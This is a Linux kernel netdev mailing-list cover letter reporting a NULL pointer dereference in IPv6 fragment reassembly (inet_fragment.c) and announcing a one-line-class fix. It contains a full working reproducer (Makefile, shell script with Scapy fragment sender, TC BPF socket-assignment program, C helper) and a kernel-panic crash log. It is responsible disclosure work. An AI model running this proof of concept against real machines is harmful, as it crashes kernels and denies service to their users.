Received: from mail-pj1-f52.google.com (mail-pj1-f52.google.com [209.85.216.52])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0DA27381B0F
	for <netdev@vger.kernel.org>; Thu,  1 Oct 2026 07:54:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.52
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790841290; cv=none; b=QvyYfNqpPH11aRFI2WJFZEz4VDvbN3P/ByO/Rl/RF2T9bRXs1fxcEPQ5fyhmLG2+NXjE+mSCzT1yPrAQEA6fVCCbOA7M3/G1DykHkLU8I2Y0ApBFh9MK5bXX8/xNWATamZduAmZrwLsYu5QzNbuXqFpwqfy84nzWQfjRGwD1/tM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790841290; c=relaxed/simple;
	bh=Hqw3BvzQyA5KCp5ESFoHRcyxh+Z215BY7N3T25tgVVU=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=DuxdoF3nm03tjrsiEBAHIDufaBPHSsnmyRLb/5TIJ1X522rx/52mPs4CCSHQP+5DO8SvO8UnC9fMquS8obOOgalyPvhUZaO/wlDucNBQt90E1lObWPgH5VPTZgq1fQUZ7RXT24YUwSOLYkRqj7VvA7Sed+rhghUygz+xPwp7EnA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=IDy8kDIW; arc=none smtp.client-ip=209.85.216.52
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="IDy8kDIW"
Received: by mail-pj1-f52.google.com with SMTP id 98e67ed59e1d1-39647184c73so210929a91.1
        for <netdev@vger.kernel.org>; Thu, 01 Oct 2026 00:54:47 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790841287; x=1791446087; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=yd9/rhQ4NGCN7CuVcv/RwFEl2/m9jTQ2KyDZwg1ggMQ=;
        b=IDy8kDIW0SWAf7JxF8qMJ9LxnjqbKHQE1IJZuIPKRW7cgdhbDpQXPaphfNXlZGQBYO
         2qqz+UwCtSlKnnmSYcqFIO0Bk40GXCu5PVQeuzdyB+JDDzCfKFuJnziwG3PDJ29RN15w
         qK7TEFdDYd5G3IGFPfZ582pulqPyU9K71x7WTqv5w+lo2y6B4cQttLEGkypSoL9OI19k
         GBqukJWtK0lypVL+bGiqeiRgH5d9HYg5cAcwK5j6fcGmodRWEx2yBTdfY94itmLwkPKJ
         u1q+/PS8ONd71LEOrHfGxfYjpU62v8mT9R984/jKRYTNOKd1MZ8GxDqFp4h6EA1EY0+y
         ci2A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790841287; x=1791446087;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=yd9/rhQ4NGCN7CuVcv/RwFEl2/m9jTQ2KyDZwg1ggMQ=;
        b=lOqNgKtTpjURstUetgAy9fY35TtwasS7vLNWz+DzInB2+aGIaZKpkH8pGPEx4nJdCz
         CkieFJrH/Mq+J2othIHsprTKouWOdTW+M2wSbT8fIbrzuZdGIEIUAeWg3tPi5+ajF5EC
         /MtpDB7iW8GLZriLaG13ZX5QRGyRuFSq6AUjcAyKmkOcB4m/D/JDcPanDpo/4IpDzFco
         aptzjdXzk6gSpeHloPMhIb2q++x9BrMSrMMs7CHCKB2YRtf4xS/qSE4hYmrstEpcFYcZ
         nIl4/TjAEVG/PVbListnm/5Kn6jhRPrJ+s8yF5Z85NQvDDStiu6ieJIPOa6osbLST9ZP
         0byQ==
X-Gm-Message-State: AFq9FYLD7I3p5QJwp++2wJToieDs6xYXfWzByKXYq0uLGqcUeCzELJ5F
	9KJzFPP9VVADUuhNExCbllUVcJ/oxZHEahhJXsmmJHqDLhJejgwFU7ZI/HTIO+KY1hTYAtZleN7
	qA2u2/w==
X-Gm-Gg: AYBFou2TqvRdiNYhkoEMQQSyBoFafgigPH9UoCVtvv9kSptacBcWG4C/XnFOrwmSf2u
	7Mf7hcBU2HKyE+7nmnX3wORCW8EJ2IEiL6yLgLrGYopuChY2kKofYRBUp0ieNa/VCBRlQ8i+732
	HipZ9mooP9K3g3Ao5VYtDCeTCCKeRCe4We73j8Ybnf1gFcMQZUjAhMgwQL+arYVE/umQq6mqj7u
	dqsO/rzPT2BKj/g0LGILTQpVqVw3SDwrI6Xt2Uye8ncwo4TbnUgLVQJBLSJ3nNSJLwVVwZMXlx5
	9WQfo1pPlCOOFqZjFrLMqwP1Dd5Y/X+MO01rn2gYxEOY27Jog5bwPujqSGmZ+AFD/Lcc65c2vEF
	VNBo6azyLoLMUX7J4jJX7BFreMkI2AH19Ej6Qgly93Vb+3oLKFwIfAYiCQ4fmEbLhMaX2iAs0Pc
	bawQlpLtvEWXW1ArMCTGSdY1GF7Vvijx0yiZpPTgyLI1F6gn667EilwcBCPr21aXwU9zOFwTqEX
	8PJ2LTx
X-Received: by 2002:a17:90b:2604:b0:39d:e445:1d44 with SMTP id 98e67ed59e1d1-3a4f3934df1mr1290367a91.31.1790841286811;
        Thu, 01 Oct 2026 00:54:46 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([191.222.220.30])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a4f46bc991sm3060243a91.4.2026.10.01.00.54.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 01 Oct 2026 00:54:46 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	herbert@gondor.apana.org.au,
	vega@nebusec.ai,
	petalzu987@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] inet: frags: orphan non-wmem skbs before building frag_list
Date: Thu,  1 Oct 2026 15:54:38 +0800
Message-ID: <cover.1790761119.git.petalzu987@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Zixuan Chai <petalzu987@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/inet_fragment.c. The reproducer
requires root in the initial namespace to configure TC ingress BPF socket
assignment; fragmented IPv6 traffic received through that configuration
triggers the crash.

This bug is tracked at: https://bugtracker.nebusec.ai/f/11598

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

In the non-coalescing branch of inet_frag_reasm_finish(), a fragment skb is
linked into the completed skb's frag_list after its socket pointer is
cleared. If the fragment still has a non-wmem destructor, the callback
remains installed and may dereference the cleared socket when the skb is
released.

IPv6 input can preserve socket ownership installed by bpf_sk_assign(). When
fragment reassembly cannot coalesce an skb after exhausting MAX_SKB_FRAGS,
the non-coalescing path clears fp->sk but leaves fp->destructor intact.
Later, releasing the frag_list invokes sock_pfree() with fp->sk == NULL,
causing a KASAN-reported NULL pointer dereference. The fix orphans non-wmem
fragments with a destructor before linking them into frag_list, while
preserving the existing socket-pointer clearing for other fragments and
wmem skbs.

The reproducer needs an ingress TC BPF program that calls bpf_sk_assign(),
so it is not reachable by an unprivileged user in the tested setup. The
network-trigger scenario assumes that this ingress socket-assignment
configuration is available.

Reproducer:

Run as root in the initial namespace. The setup requires TC/BPF support,
iproute2, Python 3 with Scapy, clang, and kernel headers for building the
BPF program. In the poc directory, build and run:

    make KDIR=<kernel-source> KBUILD=<kernel-source>/build
    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN Makefile------
CLANG ?= clang
CC ?= gcc
KDIR ?= /home/data/repos/linux-repos/linux-lts-6.12.95
KBUILD ?= $(KDIR)/build
BPF_CFLAGS := -O2 -g -target bpf -Wall -Werror \
	-I$(KDIR)/tools/lib/bpf \
	-I$(KDIR)/tools/include/uapi \
	-I$(KDIR)/include/uapi \
	-I$(KDIR)/arch/x86/include/uapi \
	-I$(KBUILD)/include/generated/uapi \
	-I$(KDIR)/include \
	-I$(KDIR)/arch/x86/include \
	-I$(KBUILD)/include/generated \
	-I$(KBUILD)/arch/x86/include/generated

all: poc poc.bpf.o

poc: poc.c
	$(CC) -O2 -g -Wall -Wextra -o $@ $<

poc.bpf.o: poc.bpf.c
	$(CLANG) $(BPF_CFLAGS) -c $< -o $@

clean:
	rm -f poc poc.bpf.o
------END Makefile--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
NS=nsfrag
HOST_IF=v0
PEER_IF=v1
SRC_ADDR=2001:db8:1::2
DST_ADDR=2001:db8:1::1
POC_PID=

cleanup() {
	if [ -n "${POC_PID}" ]; then
		kill "${POC_PID}" 2>/dev/null || true
	fi
	tc qdisc del dev "${HOST_IF}" clsact 2>/dev/null || true
	ip netns del "${NS}" 2>/dev/null || true
	ip link del "${HOST_IF}" 2>/dev/null || true
	rm -f /sys/fs/bpf/tc/globals/server_map
}

trap cleanup EXIT

sysctl -w kernel.panic_on_warn=0
mountpoint -q /sys/fs/bpf || mount -t bpf bpf /sys/fs/bpf
mkdir -p /sys/fs/bpf/tc/globals
cleanup

ip netns add "${NS}"
ip link add "${HOST_IF}" type veth peer name "${PEER_IF}"
ip link set "${PEER_IF}" netns "${NS}"
ip -6 addr add "${DST_ADDR}/64" nodad dev "${HOST_IF}"
ip link set "${HOST_IF}" up
ip netns exec "${NS}" ip link set lo up
ip netns exec "${NS}" ip -6 addr add "${SRC_ADDR}/64" nodad dev "${PEER_IF}"
ip netns exec "${NS}" ip link set "${PEER_IF}" up

tc qdisc add dev "${HOST_IF}" clsact
tc filter add dev "${HOST_IF}" ingress bpf direct-action object-file "$DIR/poc.bpf.o" section tc

POC_BIND_ADDR="${DST_ADDR}" "$DIR/poc" >"$DIR/poc.out" 2>"$DIR/poc.err" &
POC_PID=$!

for _ in $(seq 1 100); do
	if grep -q '^READY ' "$DIR/poc.out" 2>/dev/null; then
		break
	fi
	sleep 0.1
done

SRC_MAC="$(ip netns exec "${NS}" cat "/sys/class/net/${PEER_IF}/address")"
DST_MAC="$(cat "/sys/class/net/${HOST_IF}/address")"

ip netns exec "${NS}" env SRC_MAC="${SRC_MAC}" DST_MAC="${DST_MAC}" SRC_ADDR="${SRC_ADDR}" DST_ADDR="${DST_ADDR}" python3 - <<'PY'
import os
from scapy.all import Ether, IPv6, UDP, Raw, fragment6, sendp

payload = b"A" * 60000
pkt = IPv6(src=os.environ["SRC_ADDR"], dst=os.environ["DST_ADDR"]) / UDP(sport=31337, dport=4242) / Raw(payload)
frags = fragment6(pkt, 1200)
frames = [Ether(src=os.environ["SRC_MAC"], dst=os.environ["DST_MAC"]) / frag for frag in frags]
print(f"sending {len(frames)} IPv6 fragments")
sendp(frames, verbose=False, iface="v1")
PY

wait "$POC_PID"
------END poc.sh--------

------BEGIN poc.bpf.c------
// SPDX-License-Identifier: GPL-2.0
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/pkt_cls.h>
#include <linux/types.h>

#define SEC(name) __attribute__((section(name), used))
#define __uint(name, val) int (*name)[val]
#define __type(name, val) typeof(val) *name
#define bpf_htons(x) ((__u16)__builtin_bswap16((__u16)(x)))

enum libbpf_pin_type {
	LIBBPF_PIN_NONE,
	LIBBPF_PIN_BY_NAME,
};

struct bpf_sock;

static void *(*bpf_map_lookup_elem)(void *map, const void *key) =
	(void *)BPF_FUNC_map_lookup_elem;
static long (*bpf_sk_assign)(struct __sk_buff *skb, void *sk, __u64 flags) =
	(void *)BPF_FUNC_sk_assign;
static void (*bpf_sk_release)(void *sk) = (void *)BPF_FUNC_sk_release;

struct {
	__uint(type, BPF_MAP_TYPE_SOCKMAP);
	__type(key, int);
	__type(value, __u64);
	__uint(pinning, LIBBPF_PIN_BY_NAME);
	__uint(max_entries, 1);
} server_map SEC(".maps");

SEC("tc")
int assign_ipv6_sock(struct __sk_buff *skb)
{
	const int zero = 0;
	struct bpf_sock *sk;
	long ret;

	if (skb->protocol != bpf_htons(ETH_P_IPV6))
		return TC_ACT_OK;

	sk = bpf_map_lookup_elem(&server_map, &zero);
	if (!sk)
		return TC_ACT_OK;

	ret = bpf_sk_assign(skb, sk, 0);
	bpf_sk_release(sk);
	return ret == 0 ? TC_ACT_OK : TC_ACT_SHOT;
}

char _license[] SEC("license") = "GPL";
------END poc.bpf.c--------

------BEGIN poc.c------
// SPDX-License-Identifier: GPL-2.0
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/bpf.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#define MAP_PATH "/sys/fs/bpf/tc/globals/server_map"
#define PORT 4242
#define RCVBUF (1 << 20)

static volatile sig_atomic_t stop;

static void on_signal(int signo)
{
	(void)signo;
	stop = 1;
}

static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr)
{
	return syscall(__NR_bpf, cmd, attr, sizeof(*attr));
}

static int bpf_obj_get_fd(const char *path)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.pathname = (uintptr_t)path;
	return sys_bpf(BPF_OBJ_GET, &attr);
}

static int bpf_map_update_fd(int map_fd, const void *key, const void *value)
{
	union bpf_attr attr;

	memset(&attr, 0, sizeof(attr));
	attr.map_fd = map_fd;
	attr.key = (uintptr_t)key;
	attr.value = (uintptr_t)value;
	attr.flags = BPF_ANY;
	return sys_bpf(BPF_MAP_UPDATE_ELEM, &attr);
}

int main(void)
{
	struct sockaddr_in6 addr = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(PORT),
	};
	const char *bind_addr;
	static char buf[65536];
	int one = 1;
	int map_fd;
	int sock_fd;
	int key = 0;
	ssize_t n;

	signal(SIGINT, on_signal);
	signal(SIGTERM, on_signal);

	bind_addr = getenv("POC_BIND_ADDR");
	if (!bind_addr || !*bind_addr)
		bind_addr = "::";

	if (inet_pton(AF_INET6, bind_addr, &addr.sin6_addr) != 1) {
		perror("inet_pton");
		return 1;
	}

	sock_fd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (sock_fd < 0) {
		perror("socket");
		return 1;
	}

	if (setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) < 0) {
		perror("setsockopt(SO_REUSEADDR)");
		return 1;
	}

	if (setsockopt(sock_fd, SOL_SOCKET, SO_RCVBUF, &((int){RCVBUF}),
		       sizeof(int)) < 0) {
		perror("setsockopt(SO_RCVBUF)");
		return 1;
	}

	if (bind(sock_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("bind");
		return 1;
	}

	map_fd = bpf_obj_get_fd(MAP_PATH);
	if (map_fd < 0) {
		perror("bpf_obj_get");
		return 1;
	}

	if (bpf_map_update_fd(map_fd, &key, &sock_fd) < 0) {
		perror("bpf_map_update_elem");
		return 1;
	}

	printf("READY addr=%s port=%d map=%s\n", bind_addr, PORT, MAP_PATH);
	fflush(stdout);

	n = recv(sock_fd, buf, sizeof(buf), 0);
	if (n < 0 && errno != EINTR) {
		perror("recv");
		return 1;
	}

	if (!stop)
		fprintf(stderr, "recv returned %zd\n", n);

	close(map_fd);
	close(sock_fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[  519.198976][    C1] Oops: general protection fault, probably for non-canonical address 0xdffffc0000000002: 0000 [#1] SMP KASAN NOPTI
[  519.200202][    C1] KASAN: null-ptr-deref in range [0x0000000000000010-0x0000000000000017]
[  519.200808][    C1] CPU: 1 UID: 0 PID: 12683 Comm: python3 Not tainted 7.3.0-rc4-00435-g99b43ede9e35 #1 PREEMPT(full) 
[  519.201585][    C1] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[  519.202238][    C1] RIP: 0010:sock_pfree+0x48/0x250
[  519.202642][    C1] Code: 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 f7 01 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 6b 18 48 8d 7d 12 48 89 fa 48 c1 ea 03 <0f> b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 a6 01 00 00
[  519.204020][    C1] RSP: 0000:ffa00000001c8b00 EFLAGS: 00010202
[  519.204467][    C1] RAX: dffffc0000000000 RBX: ff1100004b14e580 RCX: 0000000000000102
[  519.205042][    C1] RDX: 0000000000000002 RSI: ffffffff896132d0 RDI: 0000000000000012
[  519.205613][    C1] RBP: 0000000000000000 R08: 0000000000000102 R09: fffffbfff21ff12b
[  519.206186][    C1] R10: 0000000000000000 R11: 0000000000000000 R12: ffffffff896132c0
[  519.206760][    C1] R13: ff1100004b14e5e0 R14: 0000000000000000 R15: 0000000000000000
[  519.207331][    C1] FS:  00007f64cde77740(0000) GS:ff110000d5775000(0000) knlGS:0000000000000000
[  519.207973][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  519.208451][    C1] CR2: 000000001183a098 CR3: 000000004b3e3000 CR4: 0000000000753ef0
[  519.209022][    C1] PKRU: 55555554
[  519.209289][    C1] Call Trace:
[  519.209536][    C1]  <IRQ>
[  519.209752][    C1]  ? __pfx_sock_pfree+0x10/0x10
[  519.210121][    C1]  skb_release_head_state+0x3e7/0x3f0
[  519.210522][    C1]  kfree_skb_list_reason+0x2a7/0x4a0
[  519.210915][    C1]  ? __pfx_kfree_skb_list_reason+0x10/0x10
[  519.211346][    C1]  ? __lock_acquire+0x509/0x2110
[  519.211717][    C1]  ? __lock_acquire+0x509/0x2110
[  519.212084][    C1]  ? __css_rstat_updated+0x1c0/0x570
[  519.212480][    C1]  ? __pfx___css_rstat_updated+0x10/0x10
[  519.212899][    C1]  skb_release_data+0x640/0x860
[  519.213264][    C1]  ? rcu_is_watching+0x13/0xc0
[  519.213625][    C1]  napi_consume_skb+0x228/0x320
[  519.213991][    C1]  skb_defer_free_flush+0x17a/0x280
[  519.214383][    C1]  net_rx_action+0x383/0xea0
[  519.214737][    C1]  ? raise_softirq_irqoff+0x9/0x40
[  519.215122][    C1]  ? __pfx_net_rx_action+0x10/0x10
[  519.215508][    C1]  ? kvm_sched_clock_read+0x16/0x30
[  519.215898][    C1]  ? sched_clock+0x39/0x60
[  519.216237][    C1]  ? sched_clock_cpu+0x6c/0x550
[  519.216607][    C1]  ? do_raw_spin_lock+0x12b/0x270
[  519.216983][    C1]  ? __pfx_sched_clock_cpu+0x10/0x10
[  519.217382][    C1]  ? kvm_sched_clock_read+0x16/0x30
[  519.217771][    C1]  ? sched_clock+0x39/0x60
[  519.218109][    C1]  handle_softirqs+0x1d3/0x990
[  519.218478][    C1]  __irq_exit_rcu+0x175/0x220
[  519.218835][    C1]  irq_exit_rcu+0x9/0x30
[  519.219159][    C1]  common_interrupt+0xf7/0x110
[  519.219521][    C1]  </IRQ>
[  519.219744][    C1]  <TASK>
[  519.219967][    C1]  asm_common_interrupt+0x26/0x40
[  519.220342][    C1] RIP: 0010:check_preemption_disabled+0x2c/0x170
[  519.220811][    C1] Code: 41 55 49 89 f5 41 54 55 48 89 fd 53 0f 1f 44 00 00 65 44 8b 25 9d 87 9e 08 65 48 8b 1d 85 87 9e 08 31 ff 89 de 0f 1f 44 00 00 <85> db 74 15 0f 1f 44 00 00 44 89 e0 5b 5d 41 5c 41 5d 41 5e e9 9b
[  519.222176][    C1] RSP: 0000:ffa0000001a57d60 EFLAGS: 00000246
[  519.222626][    C1] RAX: 0000000000000001 RBX: 8000000000000002 RCX: ffffffff823c4e4a
[  519.223199][    C1] RDX: fffffbfff21ff12c RSI: 0000000000000002 RDI: 0000000000000000
[  519.223771][    C1] RBP: ffffffff8c41a4c0 R08: 0000000000000000 R09: fffffbfff21ff12b
[  519.224342][    C1] R10: ffffffff90ff895f R11: 0000000000000000 R12: 0000000000000001
[  519.224912][    C1] R13: ffffffff8c41a480 R14: ff11000028635768 R15: ffd1ffffffd34540
[  519.225484][    C1]  ? count_memcg_events+0x2ca/0x530
[  519.225875][    C1]  rcu_is_watching+0x13/0xc0
[  519.226224][    C1]  count_memcg_events+0x3db/0x530
[  519.226605][    C1]  count_memcg_events_mm.constprop.0+0xca/0x2a0
[  519.227069][    C1]  handle_mm_fault+0x540/0xac0
[  519.227429][    C1]  do_user_addr_fault+0x616/0x1320
[  519.227810][    C1]  ? rcu_is_watching+0x13/0xc0
[  519.228170][    C1]  exc_page_fault+0xbe/0x170
[  519.228517][    C1]  asm_exc_page_fault+0x26/0x30
[  519.228878][    C1] RIP: 0033:0x502a06
[  519.229170][    C1] Code: 48 89 f5 53 48 83 ec 08 48 8b 1f 48 39 df 74 4c 48 89 da 90 48 8b 42 08 48 8b 4a 10 83 e0 01 48 c1 e1 02 48 09 c8 48 83 c8 02 <48> 89 42 08 48 8b 12 49 39 d6 75 de 66 0f 1f 44 00 00 4c 8b 63 18
[  519.230539][    C1] RSP: 002b:00007fff5adbfc70 EFLAGS: 00010202
[  519.230983][    C1] RAX: 000000000000000e RBX: 00007f64cdddb030 RCX: 000000000000000c
[  519.231556][    C1] RDX: 000000001183a090 RSI: 00007fff5adbfd40 RDI: 000000001175e950
[  519.232126][    C1] RBP: 00007fff5adbfd40 R08: 0000000000000000 R09: 00007f64cc65ab70
[  519.232697][    C1] R10: 0000000000000002 R11: 00007f64cc6d5990 R12: 000000001175e950
[  519.233269][    C1] R13: 00007fff5adbfd40 R14: 000000001175e950 R15: 0000000000000002
[  519.233842][    C1]  </TASK>
[  519.234073][    C1] Modules linked in:
[  519.234413][    C1] ---[ end trace 0000000000000000 ]---
[  519.234815][    C1] RIP: 0010:sock_pfree+0x48/0x250
[  519.234833][    C1] Code: 48 89 fa 48 c1 ea 03 80 3c 02 00 0f 85 f7 01 00 00 48 b8 00 00 00 00 00 fc ff df 48 8b 6b 18 48 8d 7d 12 48 89 fa 48 c1 ea 03 <0f> b6 04 02 48 89 fa 83 e2 07 38 d0 7f 08 84 c0 0f 85 a6 01 00 00
[  519.234844][    C1] RSP: 0000:ffa00000001c8b00 EFLAGS: 00010202
[  519.234854][    C1] RAX: dffffc0000000000 RBX: ff1100004b14e580 RCX: 0000000000000102
[  519.234862][    C1] RDX: 0000000000000002 RSI: ffffffff896132d0 RDI: 0000000000000012
[  519.234869][    C1] RBP: 0000000000000000 R08: 0000000000000102 R09: fffffbfff21ff12b
[  519.234877][    C1] R10: 0000000000000000 R11: 0000000000000000 R12: ffffffff896132c0
[  519.234884][    C1] R13: ff1100004b14e5e0 R14: 0000000000000000 R15: 0000000000000000
[  519.234891][    C1] FS:  00007f64cde77740(0000) GS:ff110000d5775000(0000) knlGS:0000000000000000
[  519.234903][    C1] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  519.234911][    C1] CR2: 000000001183a098 CR3: 000000004b3e3000 CR4: 0000000000753ef0
[  519.234918][    C1] PKRU: 55555554
[  519.234924][    C1] Kernel panic - not syncing: Fatal exception in interrupt
[  519.242666][    C1] Kernel Offset: disabled
[  519.242986][    C1] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Zixuan Chai

Zixuan Chai (1):
  inet: frags: orphan non-wmem skbs before building frag_list

 net/ipv4/inet_fragment.c | 5 ++++-
 1 file changed, 4 insertions(+), 1 deletion(-)

-- 
2.34.1

